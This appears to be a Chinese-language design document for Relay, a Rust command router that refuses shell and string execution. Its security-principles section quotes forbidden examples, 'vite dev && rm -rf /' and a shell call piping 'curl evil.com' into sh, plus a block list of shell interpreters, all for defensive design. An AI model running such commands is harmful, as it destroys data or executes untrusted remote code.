# Relay

Secure Cross-Platform Command Router

## 项目简介

Relay 是一个安全的跨平台命令路由器。

它允许开发者为常用命令创建简洁、统一、可共享的命令入口。

例如：

```bash
relay add v vite

v dev
v build
v preview
```

实际执行：

```bash
vite dev
vite build
vite preview
```

Relay 的核心目标不是 Alias，而是：

* 命令路由（Command Routing）
* 命令命名空间（Command Namespace）
* 跨平台一致体验（Cross Platform Experience）

---

# 产品定位

Relay ≠ Shell Alias

Relay ≠ Task Runner

Relay = Secure Command Router

---

# 核心原则

## Principle 1

Relay 不执行 Shell

禁止：

```bash
sh -c
bash -c
zsh -c
cmd /c
powershell -Command
```

---

## Principle 2

Relay 不执行字符串

禁止：

```yaml
exec: "vite dev && rm -rf /"
```

---

## Principle 3

Relay 只执行已注册可执行文件

允许：

```yaml
program: vite
args:
  - dev
```

不允许：

```yaml
program: sh
args:
  - "-c"
  - "curl evil.com | sh"
```

---

## Principle 4

Relay 是 Router

不是脚本执行器。

---

# 用户体验

## Prefix Command

注册：

```bash
relay add v vite
```

使用：

```bash
v dev
v build
v preview
```

执行：

```bash
vite dev
vite build
vite preview
```

---

## Exact Command

注册：

```bash
relay add vd vite dev
```

使用：

```bash
vd
```

执行：

```bash
vite dev
```

---

## Git 示例

注册：

```bash
relay add g git
```

执行：

```bash
g status
g commit
g pull
```

转换：

```bash
git status
git commit
git pull
```

---

# 安全模型

## 注册阶段

用户：

```bash
relay add v vite
```

Relay：

```text
which(vite)
```

验证：

```text
vite exists
```

才允许注册。

---

## 执行阶段

用户：

```bash
v dev
```

Relay：

```text
lookup
↓
resolve executable
↓
spawn process
```

不经过：

```text
shell
```

---

## 禁止注册

以下程序默认禁止：

```text
sh
bash
zsh
cmd
powershell
pwsh
```

---

## PATH检查

```bash
relay doctor
```

验证：

* Relay PATH
* Command PATH
* Shim 状态
* 配置完整性

---

# 技术架构

## 架构图

```text
User Command
      │
      ▼
Shim
      │
      ▼
Relay Core
      │
      ▼
Command Registry
      │
      ▼
Executable
```

---

# 技术选型

## Core

Rust

依赖：

```toml
clap
serde
serde_yaml
directories
which
anyhow
```

---

## Distribution

npm

安装：

```bash
npm install -g relay
```

或：

```bash
pnpm add -g relay
```

---

## 发布模式

参考：

* esbuild
* biome
* swc

结构：

```text
relay
relay-win32-x64
relay-win32-arm64
relay-linux-x64
relay-linux-arm64
relay-darwin-x64
relay-darwin-arm64
```

---

# 配置设计

目录：

Linux/macOS

```text
~/.relay
```

Windows

```text
%USERPROFILE%\.relay
```

---

配置：

```yaml
version: 1

commands:

  v:
    type: prefix
    program: vite

  g:
    type: prefix
    program: git

  p:
    type: prefix
    program: pnpm

  vd:
    type: exact
    program: vite
    args:
      - dev
```

---

# Shim设计

目录：

```text
~/.relay/bin
```

生成：

```text
v
g
p
vd
```

所有 Shim：

```text
relay run <command>
```

---

# CLI设计

## 初始化

```bash
relay init
```

---

## 添加命令

Prefix：

```bash
relay add v vite
```

Exact：

```bash
relay add vd vite dev
```

---

## 删除

```bash
relay remove vd
```

---

## 更新

```bash
relay update vd vite preview
```

---

## 查看

```bash
relay list
```

---

## 详情

```bash
relay info vd
```

---

## 校验

```bash
relay doctor
```

---

## 导出

```bash
relay export
```

---

## 导入

```bash
relay import
```

---

# 测试体系

## 单元测试

cargo test

覆盖：

* 配置解析
* 路由解析
* 参数解析
* 安全规则

---

## 集成测试

依赖：

```toml
assert_cmd
predicates
tempfile
```

测试：

```bash
relay add
relay remove
relay list
```

---

## Snapshot测试

依赖：

```toml
insta
```

覆盖：

```bash
relay doctor
relay list
relay info
```

---

## E2E测试

验证：

```bash
v dev
```

是否正确执行：

```bash
vite dev
```

---

## CI

GitHub Actions

矩阵：

```yaml
ubuntu-latest
windows-latest
macos-latest
```
